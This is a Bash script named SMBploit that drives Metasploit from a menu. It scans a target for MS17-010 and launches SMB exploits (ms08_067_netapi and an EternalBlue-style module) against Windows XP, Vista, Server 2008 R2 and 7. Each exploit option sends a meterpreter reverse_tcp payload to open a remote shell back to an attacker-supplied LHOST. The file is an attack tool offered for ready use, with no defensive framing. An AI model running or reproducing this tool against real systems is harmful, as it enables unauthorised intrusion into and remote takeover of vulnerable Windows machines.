#!/bin/bash

#Author: d4t4s3c
#Email:  d4t4s3c@protonmail.com
#GitHub: www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
nc="\e[0m"

#var
shell=🡆
n0=0
n1=1
n2=2
n3=3
n4=4
n5=5
n6=6
n7=7
n8=8
si=✔
no=x

tput civis
clear

function checkroot(){
	    echo ""
	    echo -e "$a check root user $nc"
	    sleep 4
    if [ "$(id -u)" == "0" ]; then
	    echo ""
	    echo -e " $b[$v$si$b] root $nc"
	    sleep 4
	    echo ""
    else
            echo ""
	    echo -e " $b[$r$no$b] root $nc"
	    sleep 4
	    echo ""
	    echo -e "$r EXITING $nc"
	    sleep 4
	    echo ""
	    exit
    fi	
}

checkroot

#serv
service postgresql start
clear

function banner(){
       echo -e "$b ┌══════════════════════════════════════════┐"
       echo -e "$b ║$v  ____  __  __ ____        _       _ _    $b║"
       echo -e "$b ║$v / ___||  \/  | __ ) _ __ | | ___ (_) |_  $b║"
       echo -e "$b ║$v \___ \| |\/| |  _ \| '_ \| |/ _ \| | __| $b║"
       echo -e "$b ║$v  ___) | |  | | |_) | |_) | | (_) | | |_  $b║"
       echo -e "$b ║$v |____/|_|  |_|____/| .__/|_|\___/|_|\__| $b║"   
       echo -e "$b ║$v                    |_|                   $b║"
       echo -e "$b ║$r  Author  $b: $a d4t4s3c                      $b║"
       echo -e "$b ║$r  Email   $b: $a d4t4s3c@protonmail.com       $b║"
       echo -e "$b ║$r  GitHub  $b: $a www.github.com/d4t4s3c       $b║"
       echo -e "$b ╠══════════════════════════════════════════╣"
       echo -e "$b ║  Id   Targets                            $b║"
       echo -e "$b ║  ---  ----------------------------       $b║"
       echo -e "$b ║  [$v$n0$b]  Scan (Vulnerability)               $b║"
       echo -e "$b ║  [$v$n1$b]  Windows XP                         $b║"
       echo -e "$b ║  [$v$n2$b]  Windows Vista (x86)                $b║"
       echo -e "$b ║  [$v$n3$b]  Windows Vista (x64)                $b║"
       echo -e "$b ║  [$v$n4$b]  Windows Server 2008 R2 (x86)       $b║"
       echo -e "$b ║  [$v$n5$b]  Windows Server 2008 R2 (x64)       $b║"
       echo -e "$b ║  [$v$n6$b]  Windows 7 (x86)                    $b║"
       echo -e "$b ║  [$v$n7$b]  Windows 7 (x64)                    $b║"
       echo -e "$b ║  [$v$n8$b]  Exit                               $b║"
       echo -e "$b └══════════════════════════════════════════┘$b"
       echo ""
}

tput cnorm

function menu(){
read -p " $(echo -e $v$shell $nc)" opc

    if [ $opc -eq 0 ]; then
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    clear
	    echo -e "$a Scan IP:$v $rhost $nc"
	    echo ""
	    msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010;
	    set RHOSTS $rhost;
	    run;
	    exit; "
	    echo ""
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 1 ]; then
	    echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 2 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 4;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 3 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 5;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 4 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 7;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
            echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 5 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 7;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 6 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 8;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 7 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 8;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    banner
	    menu
    elif [ $opc -eq 8 ]; then
	    echo ""
	    echo ""
	    echo -e "$a        |\/\/\/|"
            echo -e "        |      |" 
            echo -e "        |      |" 
            echo -e "        | (o)(o) " 
            echo -e "        C      _) "
            echo -e "         | ,___|  "
            echo -e "         |   /    "
            echo -e "        /____\ "
            echo -e "       /      \ $nc"
            echo -e "$b#### $v BYE $v HACKER $b ####"
            echo ""
            echo ""
	    sleep 3
	    exit
    else
	    echo ""
	    echo -e "$a invalid option $nc"
	    echo ""
	    sleep 2
	    clear
	    sleep 1
	    banner
	    menu
    fi
}

banner
menu
